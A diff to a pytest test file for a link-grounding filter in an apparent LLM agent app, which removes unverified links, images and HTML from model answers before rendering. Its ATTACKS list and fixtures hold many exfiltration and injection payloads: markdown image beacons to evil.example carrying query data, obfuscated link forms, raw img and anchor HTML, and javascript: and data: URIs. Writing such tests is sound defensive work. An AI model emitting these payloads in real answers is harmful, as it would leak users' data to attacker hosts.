@@ -4,10 +4,14 @@ import json
 
 import pytest
 from langchain_core.messages import HumanMessage, ToolMessage
+from markdown_it import MarkdownIt
 
 from src.grounding import allowed_urls, enforce_grounding
 
-ALLOWED = {"https://a.org", "https://www.google.com/maps/dir/?api=1&destination=Zoo%2C+Berlin"}
+MAPS = "https://www.google.com/maps/dir/?api=1&destination=Zoo%2C+Berlin"
+ALLOWED = {"https://a.org", MAPS}
+# CommonMark plus GFM-style tables and strikethrough, close to what Streamlit renders.
+_PARSER = MarkdownIt("commonmark").enable(["table", "strikethrough"])
 
 
 def _tool(payload: dict) -> ToolMessage:
@@ -15,13 +19,35 @@ def _tool(payload: dict) -> ToolMessage:
     return ToolMessage(content=json.dumps(payload), tool_call_id="1", name="t")
 
 
-def test_allowed_urls_collects_nested_links_from_tool_messages_only():
-    """Links come from tool results, never from the user's message."""
+def _rendered_targets(markdown: str) -> list[tuple[str, str]]:
+    """Return (kind, target) for every link, image and HTML a renderer would produce."""
+    targets = []
+
+    def walk(tokens):
+        """Collect link and image targets from tokens and their children."""
+        for token in tokens:
+            if token.type == "link_open":
+                targets.append(("link", token.attrGet("href") or ""))
+            elif token.type == "image":
+                targets.append(("image", token.attrGet("src") or ""))
+            elif token.type in ("html_inline", "html_block"):
+                targets.append(("html", token.content))
+            if token.children:
+                walk(token.children)
+
+    walk(_PARSER.parse(markdown))
+    return targets
+
+
+def test_allowed_urls_come_only_from_url_fields_of_tool_results():
+    """Links come from tool URL fields, never from the user's message or echoed text fields."""
     messages = [
         HumanMessage("see https://evil.example"),
         _tool({"results": [{"website": "https://a.org", "maps_url": "https://maps/x?y=1"}]}),
+        _tool({"items": [{"label": "Zoo", "note": "https://evil.example/p.png"}]}),
+        _tool({"city": "https://evil.example", "source_urls": ["https://bahn.de/x"]}),
     ]
-    assert allowed_urls(messages) == {"https://a.org", "https://maps/x?y=1"}
+    assert allowed_urls(messages) == {"https://a.org", "https://maps/x?y=1", "https://bahn.de/x"}
 
 
 def test_tool_error_text_cannot_make_a_link_verified():
@@ -38,54 +64,79 @@ def test_verified_links_stay_and_invented_ones_are_removed():
     """A link from a tool stays; an invented one becomes plain text and is reported."""
     answer = "[Website](https://a.org/) and [Fake](https://invented.example/page) see https://b.org"
     cleaned, report = enforce_grounding(answer, {"https://a.org"})
-    assert "[Website](https://a.org/)" in cleaned
+    assert _rendered_targets(cleaned) == [("link", "https://a.org/")]
     assert "invented.example" not in cleaned and "b.org" not in cleaned
     assert report.removed == ["https://invented.example/page", "https://b.org"]
-    assert not report.grounded
 
 
-@pytest.mark.parametrize(
-    "attack",
-    [
-        "![](https://evil.example/p.png?b=100)",
-        "![pic](https://evil.example/p.png)",
-        "[](https://evil.example/x)",
-        '[Zoo](https://evil.example/x "Zoo")',
-        "![z](https://evil.example/p.png 'z')",
-        "www.evil.example/page",
-        "(https://evil.example/x)",
-        "![z](HTTPS://evil.example/p.png)",
-        "![z](//evil.example/p.png)",
-        "[z](//evil.example/x)",
-        "![z](https&#58;//evil.example/p.png)",
-        "![z](https\\://evil.example/p.png)",
-        "[x][r]\n\n[r]: https&#58;//evil.example/p.png",
-        "[x][r]\n\n[r]: https://evil.example/p.png",
-        "<https://evil.example/x>",
-        "![z](<https://evil.example/p.png>)",
-        "[js](javascript:alert(1))",
-        "Visit HTTP://EVIL.EXAMPLE/x now",
-    ],
-)
-def test_no_unverified_host_survives_any_link_form(attack):
-    """Every link and image form that points to an unverified host is removed."""
-    cleaned, report = enforce_grounding(f"Ideas: {attack} done", ALLOWED)
-    assert "evil.example" not in cleaned.lower() and "javascript:" not in cleaned
-    assert report.removed
+ATTACKS = [
+    "![](https://evil.example/p.png?b=100)",
+    "![pic](https://evil.example/p.png)",
+    "[](https://evil.example/x)",
+    '[Zoo](https://evil.example/x "Zoo")',
+    "![z](https://evil.example/p.png 'z')",
+    "www.evil.example/page",
+    "(https://evil.example/x)",
+    "![z](HTTPS://evil.example/p.png)",
+    "![z](//evil.example/p.png)",
+    "![z](https&#58;//evil.example/p.png)",
+    "![z](https\\://evil.example/p.png)",
+    "[x][r]\n\n[r]: https&#58;//evil.example/p.png",
+    "<https://evil.example/x>",
+    "![z](<https://evil.example/p.png>)",
+    "[js](javascript:alert(1))",
+    "[a [b] c](javascript:alert(1))",
+    "![a [b] c](http:evil.example/p.png?ages=3-5)",
+    "![a\\]b](https:evil.example/p.png?b=100)",
+    "![x](<https:evil.example/p b.png?b=100>)",
+    '![x](https:evil.example/p.png "a\\"b")',
+    "![x][r]\n\n> [r]: https:evil.example/p.png",
+    "![x][r]\n\n- [r]: https:evil.example/p.png",
+    "![x][r]\n\n[r]:\nhttps:evil.example/p.png",
+    ":red[![a [b]](https:evil.example/p.png)]",
+    '<img src="https:evil.example/p.png">',
+    '<a href="https:evil.example">x</a>',
+    "[![img](https://evil.example/p.png)](https://a.org)",
+    "[x](data:image/png;base64,AAAA)",
+    "$\\href{https://evil.example}{x}$",
+]
+
+
+@pytest.mark.parametrize("attack", ATTACKS)
+def test_no_unverified_link_image_or_html_can_render(attack):
+    """Whatever the syntax, a renderer finds no image, no HTML and only verified links."""
+    cleaned, _ = enforce_grounding(f"Ideas: {attack} done", ALLOWED)
+    for kind, target in _rendered_targets(cleaned):
+        assert kind == "link" and target in ALLOWED, (kind, target, cleaned)
+    assert "evil.example" not in cleaned.lower()
 
 
 def test_images_are_dropped_even_from_a_verified_host():
-    """An image would load without a click, so even a tool URL is not shown as an image."""
-    cleaned, report = enforce_grounding("![zoo](https://a.org)", ALLOWED)
-    assert "![" not in cleaned and "https://a.org" not in cleaned
+    """An image would load without a click, so even a tool URL is never shown as an image."""
+    for answer in ("![zoo](https://a.org)", "[![zoo](https://a.org)](https://a.org)"):
+        cleaned, _ = enforce_grounding(answer, ALLOWED)
+        assert all(kind != "image" for kind, _ in _rendered_targets(cleaned)), cleaned
 
 
-def test_verified_maps_link_with_query_and_title_is_kept_without_its_title():
-    """A tool's maps URL stays clickable; the title is dropped; its query cannot be extended."""
-    url = "https://www.google.com/maps/dir/?api=1&destination=Zoo%2C+Berlin"
-    cleaned, report = enforce_grounding(f'[🗺️ Directions]({url} "t") and {url}&x=1', ALLOWED)
-    assert f"[🗺️ Directions]({url})" in cleaned and '"t"' not in cleaned
-    assert report.verified == [url] and report.removed == [f"{url}&x=1"]
+def test_verified_link_text_cannot_show_another_address():
+    """Link text that looks like a URL is replaced, so it cannot hide where the link goes."""
+    cleaned, _ = enforce_grounding("[https://evil.example/login](https://a.org)", ALLOWED)
+    assert "evil.example" not in cleaned and _rendered_targets(cleaned) == [
+        ("link", "https://a.org")
+    ]
+
+
+def test_answer_card_keeps_its_links_and_plain_text():
+    """The answer format's Website and Directions links survive; ordinary text stays readable."""
+    answer = (
+        "### 🦁 Zoo Berlin\nBerlin · zoo · ages 0-17 · outdoor · paid\n\n"
+        "Great for weekends & rainy days; open 9//18 per day.\n\n"
+        f'[🌐 Website](https://a.org) · [🗺️ Directions]({MAPS} "t")'
+    )
+    cleaned, report = enforce_grounding(answer, ALLOWED)
+    assert _rendered_targets(cleaned) == [("link", "https://a.org"), ("link", MAPS)]
+    assert "Great for weekends & rainy days; open 9//18 per day." in cleaned
+    assert report.grounded
 
 
 def test_answer_without_links_is_grounded():
